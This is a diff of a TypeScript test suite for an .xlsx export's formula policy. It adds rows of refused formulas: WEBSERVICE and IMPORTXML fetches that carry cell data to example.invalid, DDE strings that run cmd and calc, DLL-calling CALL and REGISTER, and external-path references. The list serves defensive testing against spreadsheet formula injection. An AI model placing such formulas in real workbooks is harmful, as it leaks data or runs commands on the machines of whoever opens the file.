@@ -117,24 +117,56 @@ describe('office xlsx formulas — no cached values, recalculation on open', () 
 describe('office formula policy — formulas stay inside the workbook', () => {
   // The opening application recalculates every formula (the workbook asks it
   // to), so a formula that can reach the network, another program or another
-  // file would do so the moment someone opens the export.
+  // file would do so the moment someone opens the export. Excel, LibreOffice
+  // and Google Sheets all recalculate an .xlsx, so each one's ways out count.
   const oneFormula = (formula: string): XlsxDescriptor => ({
     sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: { formula } }] }],
   });
 
+  // One row per refused name or pattern, grouped by family. Every row goes
+  // through renderXlsx, so it proves the export is refused, not only that the
+  // policy has a reason for it.
   const rejected: ReadonlyArray<readonly [formula: string, why: string, reason: RegExp]> = [
-    ['WEBSERVICE("https://example.invalid/?q="&B1)', 'a URL fetch carrying cell data', /uses WEBSERVICE/],
-    ['_xlfn.WEBSERVICE("https://example.invalid/")', 'the future-function prefix', /uses WEBSERVICE/],
-    ['FILTERXML(webservice("https://example.invalid/"),"//a")', 'a lower-case nested call', /uses WEBSERVICE/],
-    ['HYPERLINK("https://example.invalid/?q="&B1,"open")', 'a link carrying cell data', /uses HYPERLINK/],
-    ['_xlfn.IMAGE("https://example.invalid/a.png")', 'an image fetch', /uses IMAGE/],
-    ['RTD("server.progid",,"topic")', 'a COM real-time data server', /uses RTD/],
-    ['REGISTER.ID("kernel32","GetTickCount","J")', 'a DLL registration', /uses REGISTER\.ID/],
-    ['LET(f,WEBSERVICE,f("https://example.invalid/"))', 'a function passed as a value', /uses WEBSERVICE/],
-    ["cmd|' /C calc'!A0", 'a DDE command', /DDE reference/],
+    // URL fetches in Excel and LibreOffice.
+    ['WEBSERVICE("https://example.invalid/?q="&B1)', 'a URL fetch carrying cell data', /uses WEBSERVICE,/],
+    ['_xlfn.WEBSERVICE("https://example.invalid/")', 'the future-function prefix', /uses WEBSERVICE,/],
+    ['LEN(webservice("https://example.invalid/"))', 'a lower-case nested call', /uses WEBSERVICE,/],
+    ['LET(f,WEBSERVICE,f("https://example.invalid/"))', 'a function passed as a value', /uses WEBSERVICE,/],
+    ['FILTERXML(A1,"//a")', 'the XML parser for fetched content', /uses FILTERXML,/],
+    ['_xlfn.IMAGE("https://example.invalid/a.png")', 'an image fetch', /uses IMAGE,/],
+    // URL fetches in Google Sheets.
+    ['IMPORTDATA("https://example.invalid/?q="&A1)', 'a Google Sheets data fetch', /uses IMPORTDATA,/],
+    ['IMPORTXML("https://example.invalid/","//a")', 'a Google Sheets XML fetch', /uses IMPORTXML,/],
+    ['IMPORTHTML("https://example.invalid/","table",1)', 'a Google Sheets HTML fetch', /uses IMPORTHTML,/],
+    ['IMPORTFEED("https://example.invalid/feed")', 'a Google Sheets feed fetch', /uses IMPORTFEED,/],
+    ['IMPORTRANGE("https://example.invalid/d/x","S!A1")', 'another Google spreadsheet', /uses IMPORTRANGE,/],
+    // Links.
+    ['HYPERLINK("https://example.invalid/?q="&B1,"open")', 'a link carrying cell data', /uses HYPERLINK,/],
+    // COM servers and DLLs.
+    ['RTD("server.progid",,"topic")', 'a COM real-time data server', /uses RTD,/],
+    ['CALL("kernel32","GetTickCount","J")', 'a DLL call', /uses CALL,/],
+    ['REGISTER("kernel32","GetTickCount","J")', 'a DLL registration', /uses REGISTER,/],
+    ['REGISTER.ID("kernel32","GetTickCount","J")', 'a DLL registration by id', /uses REGISTER\.ID,/],
+    // DDE, as a reference and as LibreOffice's function.
+    ["cmd|' /C calc'!A0", 'a DDE command reference', /DDE reference/],
+    ['DDE("cmd","/c calc","x")', "LibreOffice's DDE function", /uses DDE,/],
+    // Text that becomes a reference or a formula when the client calculates.
+    ['INDIRECT("[1]Sheet1!A1")', 'an external reference hidden in a string', /uses INDIRECT,/],
+    ['SUM(INDIRECT(A1))', 'a reference read from a cell', /uses INDIRECT,/],
+    [
+      'IFERROR(__xludf.DUMMYFUNCTION("IMPORTXML(""https://example.invalid/"",""//a"")"),0)',
+      'a Google Sheets function stored as text',
+      /uses DUMMYFUNCTION,/,
+    ],
+    // Other files.
     ['[1]Sheet1!A1', 'an external workbook by index', /bracketed reference/],
-    ["'C:\\dir\\[book.xlsx]Sheet1'!A1", 'an external workbook by path', /bracketed reference/],
-    ["'\\\\host\\share\\book.xlsx'!Total", 'a UNC path', /another file by its path/],
+    ['[Book.xlsx]Sheet1!A1', 'an external workbook by name', /bracketed reference/],
+    ["'C:\\dir\\[book.xlsx]Sheet1'!A1", 'an external workbook by quoted path', /bracketed reference/],
+    ["'\\\\host\\share\\book.xlsx'!Total", 'a quoted UNC path', /another file by its path/],
+    ['\\\\host\\share\\book.xlsx!Total', 'an unquoted UNC path', /another file by its path/],
+    ['C:\\dir\\book.xlsx!Total', 'an unquoted local path', /another file by its path/],
+    ["'https://example.invalid/book.xlsx'!Total", 'a quoted URL', /another file by its path/],
+    // Fail closed.
     ['IF(A1="x', 'an unterminated string literal', /unterminated quote/],
   ];
 
@@ -173,10 +205,12 @@ describe('office formula policy — formulas stay inside the workbook', () => {
     const allowed = [
       'SUM(Data!B2:B3)',
       "SUMIFS('Offene Posten'!E:E,'Offene Posten'!C:C,A2)",
+      "VLOOKUP(A2,'Offene Posten'!A:E,5,FALSE)",
       "SUM('Jan:Dez'!B2)", // 3-D reference across sheets
       "'It''s'!A1", // escaped quote inside a sheet name
       'Image!A1', // a sheet that happens to be called Image
       'IF(A1="WEBSERVICE(x)|[y]\\\\z","a","b")', // text inside a string literal
+      'IFERROR(A2/B2,0)', // `/` outside quotes divides; it is not a path
       'YEAR(A2)&"-"&TEXT(MONTH(A2),"00")',
     ];
     for (const formula of allowed) {
